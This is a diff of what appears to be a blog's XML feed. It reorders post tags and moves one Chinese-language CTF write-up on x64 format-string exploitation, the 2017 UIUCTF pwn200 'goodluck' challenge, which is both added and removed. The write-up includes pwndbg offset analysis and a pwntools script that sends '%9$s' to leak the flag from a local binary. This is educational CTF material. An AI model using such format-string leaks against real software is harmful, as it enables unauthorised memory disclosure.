@@ -70,9 +70,9 @@
     
     <tags>
       
-      <tag>Heap</tag>
-      
       <tag>Pwn</tag>
+      
+      <tag>Heap</tag>
       
       <tag>Large Bin Attack</tag>
       
@@ -99,9 +99,9 @@
     
     <tags>
       
-      <tag>Heap</tag>
-      
       <tag>Pwn</tag>
+      
+      <tag>Heap</tag>
       
       <tag>Unsorted Bin Attack</tag>
       
@@ -128,9 +128,9 @@
     
     <tags>
       
-      <tag>Heap</tag>
-      
       <tag>Pwn</tag>
+      
+      <tag>Heap</tag>
       
       <tag>Fastbin</tag>
       
@@ -157,9 +157,9 @@
     
     <tags>
       
-      <tag>Heap</tag>
-      
       <tag>Pwn</tag>
+      
+      <tag>Heap</tag>
       
       <tag>UAF</tag>
       
@@ -392,6 +392,33 @@
   
   
   <entry>
+    <title>【PWN.0x00】Linux PWN：fmtstr exploit in x64</title>
+    <link href="/2026/01/23/fmtstr-exploit-x64/"/>
+    <url>/2026/01/23/fmtstr-exploit-x64/</url>
+    
+    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。但是在利用格式化字符串时，虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。</p></blockquote><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="2017-UIUCTF-pwn200-Goodluck"><a href="#2017-UIUCTF-pwn200-Goodluck" class="headerlink" title="2017 UIUCTF pwn200 Goodluck"></a>2017 UIUCTF pwn200 Goodluck</h3><h4 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec:"></a>Checksec:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># zer0ptr @ DESKTOP-FHEMUHT in ~/CTF-Training/Pwn/fmtstr/UIUCTF-pwn200Goodluck on git:master x [12:06:12]</span><br>$ checksec goodluck<br>[*] Checking <span class="hljs-keyword">for</span> new versions of pwntools<br>    To <span class="hljs-built_in">disable</span> this functionality, <span class="hljs-built_in">set</span> the contents of /home/zer0ptr/.cache/.pwntools-cache-3.10/update to <span class="hljs-string">&#x27;never&#x27;</span> (old way).<br>    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):<br>        [update]<br>        interval=never<br>[*] You have the latest version of Pwntools (4.15.0)<br>[*] <span class="hljs-string">&#x27;/home/zer0ptr/CTF-Training/Pwn/fmtstr/UIUCTF-pwn200Goodluck/goodluck&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>可以看出程序开启了 NX 保护以及部分 RELRO 保护。</p><h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">21</span>; ++j )<br>&#123;<br>  v5 = format[j];<br>  <span class="hljs-keyword">if</span> ( !v5 || v11[j] != v5 )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You answered:&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(format);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nBut that was totally wrong lol get rekt&quot;</span>);<br>    fflush(_bss_start);<br>    result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">goto</span> LABEL_11;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────<br>00:0000│ rsp 0x7fffffffdcd8 —▸ 0x400890 (main+234) ◂— mov edi, 0x4009b8<br>01:0008│-040 0x7fffffffdce0 ◂— 0x31000000<br>02:0010│-038 0x7fffffffdce8 —▸ 0x602ca0 ◂— 0x363534333231 /* <span class="hljs-string">&#x27;123456&#x27;</span> */<br>03:0018│-030 0x7fffffffdcf0 —▸ 0x6022a0 ◂— 0x602<br>04:0020│-028 0x7fffffffdcf8 —▸ 0x7fffffffdd00 ◂— 0x616c667b67616c66 (<span class="hljs-string">&#x27;flag&#123;fla&#x27;</span>)<br><br>──────────────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; fmtarg 0x7fffffffdcf8<br>The index of format argument : 10 (\&quot;\%9<span class="hljs-variable">$p</span>\&quot;)<br></code></pre></td></tr></table></figure><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>goodluck = ELF(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br>sh = process(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br><br>payload = <span class="hljs-string">b&quot;%9$s&quot;</span><br><span class="hljs-built_in">print</span>(payload)<br><span class="hljs-comment"># gdb.attach(sh)</span><br>sh.sendline(payload)<br><span class="hljs-built_in">print</span>(sh.recv())<br>sh.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># zer0ptr @ DESKTOP-FHEMUHT in ~/CTF-Training/Pwn/fmtstr/UIUCTF-pwn200Goodluck on git:master x [12:12:00] C:130</span><br>$ python3 exp.py<br>[*] <span class="hljs-string">&#x27;/home/zer0ptr/CTF-Training/Pwn/fmtstr/UIUCTF-pwn200Goodluck/goodluck&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br>[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./goodluck&#x27;</span>: pid 7481<br>[*] Process <span class="hljs-string">&#x27;./goodluck&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code 0 (pid 7481)<br>b<span class="hljs-string">&quot;what&#x27;s the flag\nYou answered:\nflag&#123;flag&#125;\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\nBut that was totally wrong lol get rekt\n&quot;</span><br>[*] Switching to interactive mode<br>[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive<br>$  <br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>fmtstr</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>格式化字符串漏洞</tag>
+      
+      <tag>Pwn</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>【论文笔记】Large Language Models for Code：Security Hardening and Adversarial Testing</title>
     <link href="/2026/01/23/Large_Language_Models_for_Code_Security_Hardening_and_Adversarial_Testing/"/>
     <url>/2026/01/23/Large_Language_Models_for_Code_Security_Hardening_and_Adversarial_Testing/</url>
@@ -415,33 +442,6 @@
       <tag>LLM安全</tag>
       
       <tag>Prefix Tunning</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>【PWN.0x00】Linux PWN：fmtstr exploit in x64</title>
-    <link href="/2026/01/23/fmtstr-exploit-x64/"/>
-    <url>/2026/01/23/fmtstr-exploit-x64/</url>
-    
-    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。但是在利用格式化字符串时，虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。</p></blockquote><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="2017-UIUCTF-pwn200-Goodluck"><a href="#2017-UIUCTF-pwn200-Goodluck" class="headerlink" title="2017 UIUCTF pwn200 Goodluck"></a>2017 UIUCTF pwn200 Goodluck</h3><h4 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec:"></a>Checksec:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># zer0ptr @ DESKTOP-FHEMUHT in ~/CTF-Training/Pwn/fmtstr/UIUCTF-pwn200Goodluck on git:master x [12:06:12]</span><br>$ checksec goodluck<br>[*] Checking <span class="hljs-keyword">for</span> new versions of pwntools<br>    To <span class="hljs-built_in">disable</span> this functionality, <span class="hljs-built_in">set</span> the contents of /home/zer0ptr/.cache/.pwntools-cache-3.10/update to <span class="hljs-string">&#x27;never&#x27;</span> (old way).<br>    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):<br>        [update]<br>        interval=never<br>[*] You have the latest version of Pwntools (4.15.0)<br>[*] <span class="hljs-string">&#x27;/home/zer0ptr/CTF-Training/Pwn/fmtstr/UIUCTF-pwn200Goodluck/goodluck&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>可以看出程序开启了 NX 保护以及部分 RELRO 保护。</p><h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">21</span>; ++j )<br>&#123;<br>  v5 = format[j];<br>  <span class="hljs-keyword">if</span> ( !v5 || v11[j] != v5 )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You answered:&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(format);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nBut that was totally wrong lol get rekt&quot;</span>);<br>    fflush(_bss_start);<br>    result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">goto</span> LABEL_11;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────<br>00:0000│ rsp 0x7fffffffdcd8 —▸ 0x400890 (main+234) ◂— mov edi, 0x4009b8<br>01:0008│-040 0x7fffffffdce0 ◂— 0x31000000<br>02:0010│-038 0x7fffffffdce8 —▸ 0x602ca0 ◂— 0x363534333231 /* <span class="hljs-string">&#x27;123456&#x27;</span> */<br>03:0018│-030 0x7fffffffdcf0 —▸ 0x6022a0 ◂— 0x602<br>04:0020│-028 0x7fffffffdcf8 —▸ 0x7fffffffdd00 ◂— 0x616c667b67616c66 (<span class="hljs-string">&#x27;flag&#123;fla&#x27;</span>)<br><br>──────────────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; fmtarg 0x7fffffffdcf8<br>The index of format argument : 10 (\&quot;\%9<span class="hljs-variable">$p</span>\&quot;)<br></code></pre></td></tr></table></figure><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>goodluck = ELF(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br>sh = process(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br><br>payload = <span class="hljs-string">b&quot;%9$s&quot;</span><br><span class="hljs-built_in">print</span>(payload)<br><span class="hljs-comment"># gdb.attach(sh)</span><br>sh.sendline(payload)<br><span class="hljs-built_in">print</span>(sh.recv())<br>sh.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># zer0ptr @ DESKTOP-FHEMUHT in ~/CTF-Training/Pwn/fmtstr/UIUCTF-pwn200Goodluck on git:master x [12:12:00] C:130</span><br>$ python3 exp.py<br>[*] <span class="hljs-string">&#x27;/home/zer0ptr/CTF-Training/Pwn/fmtstr/UIUCTF-pwn200Goodluck/goodluck&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br>[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./goodluck&#x27;</span>: pid 7481<br>[*] Process <span class="hljs-string">&#x27;./goodluck&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code 0 (pid 7481)<br>b<span class="hljs-string">&quot;what&#x27;s the flag\nYou answered:\nflag&#123;flag&#125;\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\nBut that was totally wrong lol get rekt\n&quot;</span><br>[*] Switching to interactive mode<br>[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive<br>$  <br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-    <categories>
-      
-      <category>fmtstr</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>格式化字符串漏洞</tag>
-      
-      <tag>Pwn</tag>
       
     </tags>
     
